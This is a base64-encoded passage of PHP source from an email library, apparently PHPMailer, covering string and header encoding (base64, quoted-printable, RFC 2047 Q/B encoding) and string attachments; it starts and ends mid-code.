CAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBzdHJpbmcgaW4gcmVxdWVzdGVkIGZvcm1hdC4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyICAgICAgVGhlIHRleHQgdG8gZW5jb2RlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBUaGUgZW5jb2RpbmcgdG8gdXNlOyBvbmUgb2YgJ2Jhc2U2NCcsICc3Yml0JywgJzhiaXQnLCAnYmluYXJ5JywgJ3F1b3RlZC1wcmludGFibGUnCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlU3RyaW5nKCRzdHIsICRlbmNvZGluZyA9IHNlbGY6OkVOQ09ESU5HX0JBU0U2NCkKICAgIHsKICAgICAgICAkZW5jb2RlZCA9ICcnOwogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkZW5jb2RpbmcpKSB7CiAgICAgICAgICAgIGNhc2Ugc3RhdGljOjpFTkNPRElOR19CQVNFNjQ6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGNodW5rX3NwbGl0KAogICAgICAgICAgICAgICAgICAgIGJhc2U2NF9lbmNvZGUoJHN0ciksCiAgICAgICAgICAgICAgICAgICAgc3RhdGljOjpTVERfTElORV9MRU5HVEgsCiAgICAgICAgICAgICAgICAgICAgc3RhdGljOjokTEUKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSBzdGF0aWM6OkVOQ09ESU5HXzdCSVQ6CiAgICAgICAgICAgIGNhc2Ugc3RhdGljOjpFTkNPRElOR184QklUOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkc3RyKTsKICAgICAgICAgICAgICAgIC8vTWFrZSBzdXJlIGl0IGVuZHMgd2l0aCBhIGxpbmUgYnJlYWsKICAgICAgICAgICAgICAgIGlmIChzdWJzdHIoJGVuY29kZWQsIC0oc3RybGVuKHN0YXRpYzo6JExFKSkpICE9PSBzdGF0aWM6OiRMRSkgewogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkIC49IHN0YXRpYzo6JExFOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2Ugc3RhdGljOjpFTkNPRElOR19CSU5BUlk6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICRzdHI7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSBzdGF0aWM6OkVOQ09ESU5HX1FVT1RFRF9QUklOVEFCTEU6CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5lbmNvZGVRUCgkc3RyKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdlbmNvZGluZycpIC4gJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VuY29kaW5nJykgLiAkZW5jb2RpbmcpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJGVuY29kZWQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBoZWFkZXIgdmFsdWUgKG5vdCBpbmNsdWRpbmcgaXRzIGxhYmVsKSBvcHRpbWFsbHkuCiAgICAgKiBQaWNrcyBzaG9ydGVzdCBvZiBRLCBCLCBvciBub25lLiBSZXN1bHQgaW5jbHVkZXMgZm9sZGluZyBpZiBuZWVkZWQuCiAgICAgKiBTZWUgUkZDODIyIGRlZmluaXRpb25zIGZvciBwaHJhc2UsIGNvbW1lbnQgYW5kIHRleHQgcG9zaXRpb25zLAogICAgICogYW5kIFJGQzIwNDcgZm9yIGlubGluZSBlbmNvZGluZ3MuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyICAgICAgVGhlIGhlYWRlciB2YWx1ZSB0byBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBvc2l0aW9uIFdoYXQgY29udGV4dCB0aGUgc3RyaW5nIHdpbGwgYmUgdXNlZCBpbgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVIZWFkZXIoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKQogICAgewogICAgICAgICRwb3NpdGlvbiA9IHN0cnRvbG93ZXIoJHBvc2l0aW9uKTsKICAgICAgICBpZiAoJHRoaXMtPlVzZVNNVFBVVEY4ICYmICEoImNvbW1lbnQiID09PSAkcG9zaXRpb24pKSB7CiAgICAgICAgICAgIHJldHVybiB0cmltKHN0YXRpYzo6bm9ybWFsaXplQnJlYWtzKCRzdHIpKTsKICAgICAgICB9CgogICAgICAgICRtYXRjaGNvdW50ID0gMDsKICAgICAgICBzd2l0Y2ggKHN0cnRvbG93ZXIoJHBvc2l0aW9uKSkgewogICAgICAgICAgICBjYXNlICdwaHJhc2UnOgogICAgICAgICAgICAgICAgaWYgKCFwcmVnX21hdGNoKCcvW1wyMDAtXDM3N10vJywgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAvL0Nhbid0IHVzZSBhZGRzbGFzaGVzIGFzIHdlIGRvbid0IGtub3cgdGhlIHZhbHVlIG9mIG1hZ2ljX3F1b3Rlc19zeWJhc2UKICAgICAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IGFkZGNzbGFzaGVzKCRzdHIsICJcMC4uXDM3XDE3N1xcXCIiKTsKICAgICAgICAgICAgICAgICAgICBpZiAoKCRzdHIgPT09ICRlbmNvZGVkKSAmJiAhcHJlZ19tYXRjaCgnL1teQS1aYS16MC05ISMkJSZcJyorXC89P15fYHt8fX4gLV0vJywgJHN0cikpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICRlbmNvZGVkOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJcIiRlbmNvZGVkXCIiOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgPSBwcmVnX21hdGNoX2FsbCgnL1teXDA0MFwwNDFcMDQzLVwxMzNcMTM1LVwxNzZdLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAvKiBAbm9pbnNwZWN0aW9uIFBocE1pc3NpbmdCcmVha1N0YXRlbWVudEluc3BlY3Rpb24gKi8KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6CiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCA9IHByZWdfbWF0Y2hfYWxsKCcvWygpIl0vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAvL2ZhbGx0aHJvdWdoCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJG1hdGNoY291bnQgKz0gcHJlZ19tYXRjaF9hbGwoJy9bXDAwMC1cMDEwXDAxM1wwMTRcMDE2LVwwMzdcMTc3LVwzNzddLycsICRzdHIsICRtYXRjaGVzKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAgaWYgKCR0aGlzLT5oYXM4Yml0Q2hhcnMoJHN0cikpIHsKICAgICAgICAgICAgJGNoYXJzZXQgPSAkdGhpcy0+Q2hhclNldDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkY2hhcnNldCA9IHN0YXRpYzo6Q0hBUlNFVF9BU0NJSTsKICAgICAgICB9CgogICAgICAgIC8vUS9CIGVuY29kaW5nIGFkZHMgOCBjaGFycyBhbmQgdGhlIGNoYXJzZXQgKCJgID0/PGNoYXJzZXQ+P1tRQl0/PGNvbnRlbnQ+Pz1gIikuCiAgICAgICAgJG92ZXJoZWFkID0gOCArIHN0cmxlbigkY2hhcnNldCk7CgogICAgICAgIGlmICgnbWFpbCcgPT09ICR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgJG1heGxlbiA9IHN0YXRpYzo6TUFJTF9NQVhfTElORV9MRU5HVEggLSAkb3ZlcmhlYWQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJG1heGxlbiA9IHN0YXRpYzo6TUFYX0xJTkVfTEVOR1RIIC0gJG92ZXJoZWFkOwogICAgICAgIH0KCiAgICAgICAgLy9TZWxlY3QgdGhlIGVuY29kaW5nIHRoYXQgcHJvZHVjZXMgdGhlIHNob3J0ZXN0IG91dHB1dCBhbmQvb3IgcHJldmVudHMgY29ycnVwdGlvbi4KICAgICAgICBpZiAoJG1hdGNoY291bnQgPiBzdHJsZW4oJHN0cikgLyAzKSB7CiAgICAgICAgICAgIC8vTW9yZSB0aGFuIDEvMyBvZiB0aGUgY29udGVudCBuZWVkcyBlbmNvZGluZywgdXNlIEItZW5jb2RlLgogICAgICAgICAgICAkZW5jb2RpbmcgPSAnQic7CiAgICAgICAgfSBlbHNlaWYgKCRtYXRjaGNvdW50ID4gMCkgewogICAgICAgICAgICAvL0xlc3MgdGhhbiAxLzMgb2YgdGhlIGNvbnRlbnQgbmVlZHMgZW5jb2RpbmcsIHVzZSBRLWVuY29kZS4KICAgICAgICAgICAgJGVuY29kaW5nID0gJ1EnOwogICAgICAgIH0gZWxzZWlmIChzdHJsZW4oJHN0cikgPiAkbWF4bGVuKSB7CiAgICAgICAgICAgIC8vTm8gZW5jb2RpbmcgbmVlZGVkLCBidXQgdmFsdWUgZXhjZWVkcyBtYXggbGluZSBsZW5ndGgsIHVzZSBRLWVuY29kZSB0byBwcmV2ZW50IGNvcnJ1cHRpb24uCiAgICAgICAgICAgICRlbmNvZGluZyA9ICdRJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL05vIHJlZm9ybWF0dGluZyBuZWVkZWQKICAgICAgICAgICAgJGVuY29kaW5nID0gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICBzd2l0Y2ggKCRlbmNvZGluZykgewogICAgICAgICAgICBjYXNlICdCJzoKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+aGFzTXVsdGlCeXRlcygkc3RyKSkgewogICAgICAgICAgICAgICAgICAgIC8vVXNlIGEgY3VzdG9tIGZ1bmN0aW9uIHdoaWNoIGNvcnJlY3RseSBlbmNvZGVzIGFuZCB3cmFwcyBsb25nCiAgICAgICAgICAgICAgICAgICAgLy9tdWx0aWJ5dGUgc3RyaW5ncyB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPmJhc2U2NEVuY29kZVdyYXBNQigkc3RyLCAiXG4iKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgPSBiYXNlNjRfZW5jb2RlKCRzdHIpOwogICAgICAgICAgICAgICAgICAgICRtYXhsZW4gLT0gJG1heGxlbiAlIDQ7CiAgICAgICAgICAgICAgICAgICAgJGVuY29kZWQgPSB0cmltKGNodW5rX3NwbGl0KCRlbmNvZGVkLCAkbWF4bGVuLCAiXG4iKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnL14oLiopJC9tJywgJyA9PycgLiAkY2hhcnNldCAuICI/JGVuY29kaW5nP1xcMT89IiwgJGVuY29kZWQpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ1EnOgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+ZW5jb2RlUSgkc3RyLCAkcG9zaXRpb24pOwogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+d3JhcFRleHQoJGVuY29kZWQsICRtYXhsZW4sIHRydWUpOwogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgnPScgLiBzdGF0aWM6OiRMRSwgIlxuIiwgdHJpbSgkZW5jb2RlZCkpOwogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBwcmVnX3JlcGxhY2UoJy9eKC4qKSQvbScsICcgPT8nIC4gJGNoYXJzZXQgLiAiPyRlbmNvZGluZz9cXDE/PSIsICRlbmNvZGVkKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuICRzdHI7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJpbShzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcygkZW5jb2RlZCkpOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgaWYgYSBzdHJpbmcgY29udGFpbnMgbXVsdGktYnl0ZSBjaGFyYWN0ZXJzLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciBtdWx0aS1ieXRlIHRleHQgdG8gd3JhcCBlbmNvZGUKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhc011bHRpQnl0ZXMoJHN0cikKICAgIHsKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSkgewogICAgICAgICAgICByZXR1cm4gc3RybGVuKCRzdHIpID4gbWJfc3RybGVuKCRzdHIsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICB9CgogICAgICAgIC8vQXNzdW1lIG5vIG11bHRpYnl0ZXMgKHdlIGNhbid0IGhhbmRsZSB3aXRob3V0IG1ic3RyaW5nIGZ1bmN0aW9ucyBhbnl3YXkpCiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogRG9lcyBhIHN0cmluZyBjb250YWluIGFueSA4LWJpdCBjaGFycyAoaW4gYW55IGNoYXJzZXQpPwogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHRleHQKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhczhiaXRDaGFycygkdGV4dCkKICAgIHsKICAgICAgICByZXR1cm4gKGJvb2wpIHByZWdfbWF0Y2goJy9bXHg4MC1ceEZGXS8nLCAkdGV4dCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYW5kIHdyYXAgbG9uZyBtdWx0aWJ5dGUgc3RyaW5ncyBmb3IgbWFpbCBoZWFkZXJzCiAgICAgKiB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3Rlci4KICAgICAqIEFkYXB0ZWQgZnJvbSBhIGZ1bmN0aW9uIGJ5IHBhcmF2b2lkLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ubWItZW5jb2RlLW1pbWVoZWFkZXIucGhwIzYwMjgzCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyICAgICAgIG11bHRpLWJ5dGUgdGV4dCB0byB3cmFwIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkbGluZWJyZWFrIHN0cmluZyB0byB1c2UgYXMgbGluZWZlZWQvZW5kLW9mLWxpbmUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIsICRsaW5lYnJlYWsgPSBudWxsKQogICAgewogICAgICAgICRzdGFydCA9ICc9PycgLiAkdGhpcy0+Q2hhclNldCAuICc/Qj8nOwogICAgICAgICRlbmQgPSAnPz0nOwogICAgICAgICRlbmNvZGVkID0gJyc7CiAgICAgICAgaWYgKG51bGwgPT09ICRsaW5lYnJlYWspIHsKICAgICAgICAgICAgJGxpbmVicmVhayA9IHN0YXRpYzo6JExFOwogICAgICAgIH0KCiAgICAgICAgJG1iX2xlbmd0aCA9IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgLy9FYWNoIGxpbmUgbXVzdCBoYXZlIGxlbmd0aCA8PSA3NSwgaW5jbHVkaW5nICRzdGFydCBhbmQgJGVuZAogICAgICAgICRsZW5ndGggPSA3NSAtIHN0cmxlbigkc3RhcnQpIC0gc3RybGVuKCRlbmQpOwogICAgICAgIC8vQXZlcmFnZSBtdWx0aS1ieXRlIHJhdGlvCiAgICAgICAgJHJhdGlvID0gJG1iX2xlbmd0aCAvIHN0cmxlbigkc3RyKTsKICAgICAgICAvL0Jhc2U2NCBoYXMgYSA0OjMgcmF0aW8KICAgICAgICAkYXZnTGVuZ3RoID0gZmxvb3IoJGxlbmd0aCAqICRyYXRpbyAqIC43NSk7CgogICAgICAgICRvZmZzZXQgPSAwOwogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRtYl9sZW5ndGg7ICRpICs9ICRvZmZzZXQpIHsKICAgICAgICAgICAgJGxvb2tCYWNrID0gMDsKICAgICAgICAgICAgZG8gewogICAgICAgICAgICAgICAgJG9mZnNldCA9ICRhdmdMZW5ndGggLSAkbG9va0JhY2s7CiAgICAgICAgICAgICAgICAkY2h1bmsgPSBtYl9zdWJzdHIoJHN0ciwgJGksICRvZmZzZXQsICR0aGlzLT5DaGFyU2V0KTsKICAgICAgICAgICAgICAgICRjaHVuayA9IGJhc2U2NF9lbmNvZGUoJGNodW5rKTsKICAgICAgICAgICAgICAgICsrJGxvb2tCYWNrOwogICAgICAgICAgICB9IHdoaWxlIChzdHJsZW4oJGNodW5rKSA+ICRsZW5ndGgpOwogICAgICAgICAgICAkZW5jb2RlZCAuPSAkY2h1bmsgLiAkbGluZWJyZWFrOwogICAgICAgIH0KCiAgICAgICAgLy9DaG9tcCB0aGUgbGFzdCBsaW5lZmVlZAogICAgICAgIHJldHVybiBzdWJzdHIoJGVuY29kZWQsIDAsIC1zdHJsZW4oJGxpbmVicmVhaykpOwogICAgfQoKICAgIC8qKgogICAgICogRW5jb2RlIGEgc3RyaW5nIGluIHF1b3RlZC1wcmludGFibGUgZm9ybWF0LgogICAgICogQWNjb3JkaW5nIHRvIFJGQzIwNDUgc2VjdGlvbiA2LjcuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFRoZSB0ZXh0IHRvIGVuY29kZQogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRUCgkc3RyaW5nKQogICAgewogICAgICAgIHJldHVybiBzdGF0aWM6Om5vcm1hbGl6ZUJyZWFrcyhxdW90ZWRfcHJpbnRhYmxlX2VuY29kZSgkc3RyaW5nKSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBzdHJpbmcgdXNpbmcgUSBlbmNvZGluZy4KICAgICAqCiAgICAgKiBAc2VlIGh0dHBzOi8vd3d3LnJmYy1lZGl0b3Iub3JnL3JmYy9yZmMyMDQ3I3NlY3Rpb24tNC4yCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyICAgICAgdGhlIHRleHQgdG8gZW5jb2RlCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwb3NpdGlvbiBXaGVyZSB0aGUgdGV4dCBpcyBnb2luZyB0byBiZSB1c2VkLCBzZWUgdGhlIFJGQyBmb3Igd2hhdCB0aGF0IG1lYW5zCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGVuY29kZVEoJHN0ciwgJHBvc2l0aW9uID0gJ3RleHQnKQogICAgewogICAgICAgIC8vVGhlcmUgc2hvdWxkIG5vdCBiZSBhbnkgRU9MIGluIHRoZSBzdHJpbmcKICAgICAgICAkcGF0dGVybiA9ICcnOwogICAgICAgICRlbmNvZGVkID0gc3RyX3JlcGxhY2UoWyJcciIsICJcbiJdLCAnJywgJHN0cik7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsKICAgICAgICAgICAgY2FzZSAncGhyYXNlJzoKICAgICAgICAgICAgICAgIC8vUkZDIDIwNDcgc2VjdGlvbiA1LjMKICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ15BLVphLXowLTkhKitcLyAtJzsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAvKgogICAgICAgICAgICAgKiBSRkMgMjA0NyBzZWN0aW9uIDUuMi4KICAgICAgICAgICAgICogQnVpbGQgJHBhdHRlcm4gd2l0aG91dCBpbmNsdWRpbmcgZGVsaW1pdGVycyBhbmQgW10KICAgICAgICAgICAgICovCiAgICAgICAgICAgIC8qIEBub2luc3BlY3Rpb24gUGhwTWlzc2luZ0JyZWFrU3RhdGVtZW50SW5zcGVjdGlvbiAqLwogICAgICAgICAgICBjYXNlICdjb21tZW50JzoKICAgICAgICAgICAgICAgICRwYXR0ZXJuID0gJ1woXCkiJzsKICAgICAgICAgICAgLyogSW50ZW50aW9uYWwgZmFsbCB0aHJvdWdoICovCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy9SRkMgMjA0NyBzZWN0aW9uIDUuMQogICAgICAgICAgICAgICAgLy9SZXBsYWNlIGV2ZXJ5IGhpZ2ggYXNjaWksIGNvbnRyb2wsID0sID8gYW5kIF8gY2hhcmFjdGVycwogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXDAwMC1cMDExXDAxM1wwMTRcMDE2LVwwMzdcMDc1XDA3N1wxMzdcMTc3LVwzNzcnIC4gJHBhdHRlcm47CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgJG1hdGNoZXMgPSBbXTsKICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi9beyRwYXR0ZXJufV0vIiwgJGVuY29kZWQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAvL0lmIHRoZSBzdHJpbmcgY29udGFpbnMgYW4gJz0nLCBtYWtlIHN1cmUgaXQncyB0aGUgZmlyc3QgdGhpbmcgd2UgcmVwbGFjZQogICAgICAgICAgICAvL3NvIGFzIHRvIGF2b2lkIGRvdWJsZS1lbmNvZGluZwogICAgICAgICAgICAkZXFrZXkgPSBhcnJheV9zZWFyY2goJz0nLCAkbWF0Y2hlc1swXSwgdHJ1ZSk7CiAgICAgICAgICAgIGlmIChmYWxzZSAhPT0gJGVxa2V5KSB7CiAgICAgICAgICAgICAgICB1bnNldCgkbWF0Y2hlc1swXVskZXFrZXldKTsKICAgICAgICAgICAgICAgIGFycmF5X3Vuc2hpZnQoJG1hdGNoZXNbMF0sICc9Jyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXlfdW5pcXVlKCRtYXRjaGVzWzBdKSBhcyAkY2hhcikgewogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgkY2hhciwgJz0nIC4gc3ByaW50ZignJTAyWCcsIG9yZCgkY2hhcikpLCAkZW5jb2RlZCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLy9SZXBsYWNlIHNwYWNlcyB3aXRoIF8gKG1vcmUgcmVhZGFibGUgdGhhbiA9MjApCiAgICAgICAgLy9SRkMgMjA0NyBzZWN0aW9uIDQuMigyKQogICAgICAgIHJldHVybiBzdHJfcmVwbGFjZSgnICcsICdfJywgJGVuY29kZWQpOwogICAgfQoKICAgIC8qKgogICAgICogQWRkIGEgc3RyaW5nIG9yIGJpbmFyeSBhdHRhY2htZW50IChub24tZmlsZXN5c3RlbSkuCiAgICAgKiBUaGlzIG1ldGhvZCBjYW4gYmUgdXNlZCB0byBhdHRhY2ggYXNjaWkgb3IgYmluYXJ5IGRhdGEsCiAgICAgKiBzdWNoIGFzIGEgQkxPQiByZWNvcmQgZnJvbSBhIGRhdGFiYXNlLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyAgICAgIFN0cmluZyBhdHRhY2htZW50IGRhdGEKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lICAgIE5hbWUgb2YgdGhlIGF0dGFjaG1lbnQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nICAgIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlICAgICAgICBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZQogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wgVHJ1ZSBvbiBzdWNjZXNzZnVsbHkgYWRkaW5nIGFuIGF0dGFjaG1lbnQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGFkZFN0cmluZ0F0dGFjaG1lbnQoCiAgICAgICAgJHN0cmluZywKICAgICAgICAkZmlsZW5hbWUsCiAgICAgICAgJGVuY29kaW5nID0gc2VsZjo6RU5DT0RJTkdfQkFTRTY0LAogICAgICAgICR0eXBlID0gJycsCiAgICAgICAgJGRpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnCiAgICApIHsKICAgICAgICB0cnkgewogICAgICAgICAgICAvL0lmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBmaWxlIG5hbWUKICAgICAgICAgICAgaWYgKCcnID09PSAkdHlwZSkgewogICAgICAgICAgICAgICAgJHR5cGUgPSBzdGF0aWM6OmZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICghJHRoaXMtPnZhbGlkYXRlRW5jb2RpbmcoJGVuY29kaW5nKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZW5jb2RpbmcnKSAuICRlbmNvZGluZyk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5CiAgICAgICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBbCiAgICAgICAgICAgICAgICAwID0+ICRzdHJpbmcsCiAgICAgICAgICAgICAgICAxID0+ICRmaWxlbmFtZSwKICAgICAgICAgICAgICAgIDIgPT4gc3RhdGljOjptYl9wYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0JBU0VOQU1FKSwKICAgICAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICAgICAgNCA9PiAkdHlwZSwKICAgICAgICAgICAgICAgIDUgPT4gdHJ1ZSwgLy9pc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgICAgIDYgPT4gJGRpc3Bvc2l0aW9uLAogICAgICAgICAgICAgICAgNyA9PiAwLAogICAgICAgICAgICBdOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgewogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgKGlubGluZSkgYXR0YWNobWVudCBmcm9tIGEgZmlsZS4KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLgogICAgICogVGhlc2UgZGlmZmVyIGZyb20gJ3JlZ3VsYXInIGF0dGFjaG1lbnRzIGluIHRoYXQgdGhleSBhcmUgaW50ZW5kZWQgdG8gYmUKICAgICAqIGRpc3BsYXllZCBpbmxpbmUgd2l0aCB0aGUgbWVzc2FnZSwgbm90IGp1c3QgYXR0YWNoZWQgZm9yIGRvd25sb2FkLgogICAgICogVGhpcyBpcyB1c2VkIGluIEhUTUwgbWVzc2FnZXMgdGhhdCBlbWJlZCB0aGUgaW1hZ2VzCiAgICAgKiB0aGUgSFRNTCByZWZlcnMgdG8gdXNpbmcgdGhlIGAkY2lkYCB2YWx1ZSBpbiB